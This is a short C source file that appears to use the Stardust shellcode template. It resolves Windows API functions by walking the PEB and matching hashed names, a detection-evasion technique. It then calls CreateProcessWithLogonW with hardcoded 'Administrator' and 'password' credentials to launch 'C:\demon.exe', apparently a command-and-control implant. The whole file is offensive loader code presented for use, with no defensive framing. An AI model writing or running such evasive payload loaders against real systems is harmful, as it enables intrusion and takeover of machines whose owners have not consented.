#include <Common.h>
#include <Constexpr.h>

FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    PVOID Message = { 0 };

    //
    // resolve kernel32.dll related functions
    //
    if ( ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        if ( ! ( Instance()->Win32.LoadLibraryW = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryW" ) ) ) ) {
            return;
        }
    }

    //
    // resolve user32.dll related functions
    //
    if ( ( Instance()->Modules.User32 = Instance()->Win32.LoadLibraryW( L"User32" ) ) ) {
        if ( ! ( Instance()->Win32.MessageBoxW = LdrFunction( Instance()->Modules.User32, HASH_STR( "MessageBoxW" ) ) ) ) {
            return;
        }
    }

    //
    // resolve user32.dll related functions
    //
    if ( ( Instance()->Modules.Advapi32 = Instance()->Win32.LoadLibraryW( L"Advapi32" ) ) ) {
        if ( ! ( Instance()->Win32.CreateProcessWithLogonW = LdrFunction( Instance()->Modules.Advapi32, HASH_STR( "CreateProcessWithLogonW" ) ) ) ) {
            return;
        }
    }

    // Message = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;

    //
    // pop da message
    //
    // Instance()->Win32.MessageBoxW( NULL, Message, L"Stardust MessageBox", MB_OK );

    STARTUPINFOW s;
    RtlZeroMemory(&s, sizeof(s));
    PROCESS_INFORMATION p;
    RtlZeroMemory(&p, sizeof(p));
    Instance()->Win32.CreateProcessWithLogonW(L"Administrator", NULL, L"password", 0, L"C:\\demon.exe", NULL,
                                              CREATE_NEW_CONSOLE, NULL, NULL, &s, &p);
}

